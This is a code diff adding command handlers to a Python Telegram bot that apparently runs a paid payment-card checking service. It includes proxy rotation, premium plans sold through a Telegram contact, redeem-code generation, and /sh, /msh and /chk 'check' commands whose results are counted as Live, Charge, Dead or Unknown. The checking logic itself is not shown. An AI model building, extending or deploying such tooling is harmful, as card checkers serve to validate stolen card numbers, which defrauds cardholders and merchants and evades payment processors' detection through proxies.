+        text = f"🌐 Proxy Management\nTotal: {len(proxies)}\nActive: {active if active else 'Default'}\n\nCommands:\n/proxy add host:port:user:pass\n/proxy list\n/proxy set host:port:user:pass\n/proxy remove host:port:user:pass\n/proxy active\n/proxy default"
+        await update.message.reply_text(text, parse_mode='Markdown')
+        return
+    action = context.args[0].lower()
+    if action == "add" and len(context.args) == 2:
+        proxy = context.args[1]
+        if not validate_proxy(proxy):
+            await update.message.reply_text("Invalid format. Use host:port:user:pass")
+            return
+        if db.add_proxy(user_id, proxy):
+            await update.message.reply_text(f"Proxy added: {proxy}")
+        else:
+            await update.message.reply_text("Proxy already exists.")
+    elif action == "list":
+        proxies = db.get_user_proxies(user_id)
+        active = db.get_active_proxy(user_id)
+        if not proxies:
+            await update.message.reply_text("No proxies saved.")
+            return
+        text = "📋 Your proxies:\n"
+        for i, p in enumerate(proxies, 1):
+            text += f"{'👉 ' if p == active else '   '}{i}. {p}\n"
+        await update.message.reply_text(text)
+    elif action == "set" and len(context.args) == 2:
+        proxy = context.args[1]
+        if db.set_active_proxy(user_id, proxy):
+            await update.message.reply_text(f"Active proxy set to: {proxy}")
+        else:
+            await update.message.reply_text("Proxy not found.")
+    elif action == "remove" and len(context.args) == 2:
+        proxy = context.args[1]
+        if db.remove_proxy(user_id, proxy):
+            await update.message.reply_text(f"Proxy removed: {proxy}")
+        else:
+            await update.message.reply_text("Proxy not found.")
+    elif action == "active":
+        active = db.get_active_proxy(user_id) or "Default"
+        await update.message.reply_text(f"Active proxy: {active}")
+    elif action == "default":
+        if db.set_active_proxy(user_id, DEFAULT_PROXY):
+            await update.message.reply_text("Switched to default proxy.")
+        else:
+            await update.message.reply_text("Could not set default.")
+    else:
+        await update.message.reply_text("Unknown proxy command.")
+
+async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not context.args:
+        await update.message.reply_text("Usage: /redeem <code>")
+        return
+    code = context.args[0].upper()
+    data = db.get_redeem_code(code)
+    if not data:
+        await update.message.reply_text("Invalid code.")
+        return
+    if data["is_used"]:
+        await update.message.reply_text("Code already used.")
+        return
+    credits = data["credits"]
+    duration = data["duration"]
+    db.update_user_plan(user_id, 'premium', duration)
+    db.add_credits(user_id, credits)
+    db.use_redeem_code(code, user_id)
+    await update.message.reply_text(f"✅ Redeemed! +{credits} credits, premium until {db.get_user_plan(user_id)[1]}")
+
+async def plan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    plan = db.get_user_plan(user_id)
+    credits = db.get_user_credits(user_id)
+    proxies = db.get_user_proxies(user_id)
+    active = db.get_active_proxy(user_id) or "Default"
+    text = f"📊 Your Plan\nPlan: {plan[0].upper() if plan else 'Free'}\nExpiry: {plan[1] if plan and plan[1] else 'N/A'}\nCredits: {credits}\nProxies: {len(proxies)}\nActive proxy: {active}"
+    await update.message.reply_text(text)
+
+async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if context.args and context.args[0] == 'all' and user_id == OWNER_ID:
+        stats = db.data["stats"]
+        text = f"📊 Bot Stats\nUsers: {stats['total_users']}\nChecks: {stats['total_checks']}\nRedeems: {stats['total_redeems']}\nCodes: {len(db.data['redeem_codes'])}"
+        await update.message.reply_text(text)
+        return
+    stats = db.get_user_stats(user_id)
+    if not stats:
+        await update.message.reply_text("No stats yet.")
+        return
+    text = f"📊 Your Stats\nTotal checks: {stats['total_checks']}\nLive: {stats['live']}\nCharge: {stats['charge']}\nDead: {stats['dead']}\nUnknown: {stats['unknown']}"
+    await update.message.reply_text(text)
+
+async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "💎 Premium Plans:\n"
+        "1 Day – ₹250\n"
+        "1 Month – ₹500\n"
+        "1 Year – ₹1000\n"
+        "Lifetime – ₹2500\n\n"
+        "Contact @theaadikoder to buy."
+    )
+
+async def get_red_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("Unauthorized.")
+        return
+    if len(context.args) != 2:
+        await update.message.reply_text("Usage: /get_red <credits> <duration> (e.g., 300 1m)")
+        return
+    try:
+        credits = int(context.args[0])
+        duration = context.args[1]
+        if not duration.endswith(('m','y','d')):
+            duration += 'd'
+        code = code_manager.generate_code()
+        db.create_redeem_code(code, credits, duration, OWNER_ID)
+        await update.message.reply_text(f"Code generated: `{code}`\nCredits: {credits}\nDuration: {duration}", parse_mode='Markdown')
+    except:
+        await update.message.reply_text("Invalid input.")
+
+async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("Unknown command. Use /help.")
+
+# ============== MAIN ==============
+def main():
+    logging.basicConfig(level=logging.INFO)
+    app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(CommandHandler("sh", single_check))
+    app.add_handler(CommandHandler("msh", multi_check))
+    app.add_handler(CommandHandler("chk", file_check))
+    app.add_handler(CommandHandler("proxy", proxy_command))
+    app.add_handler(CommandHandler("redeem", redeem_command))
+    app.add_handler(CommandHandler("plan", plan_command))
+    app.add_handler(CommandHandler("stats", stats_command))
+    app.add_handler(CommandHandler("buy", buy_command))
+    app.add_handler(CommandHandler("get_red", get_red_command))
+    app.add_handler(MessageHandler(filters.Document.ALL, file_check))
+    app.add_handler(MessageHandler(filters.COMMAND, unknown))
+    print("Bot started!")
+    app.run_polling()
+
+if __name__ == "__main__":
+    main()
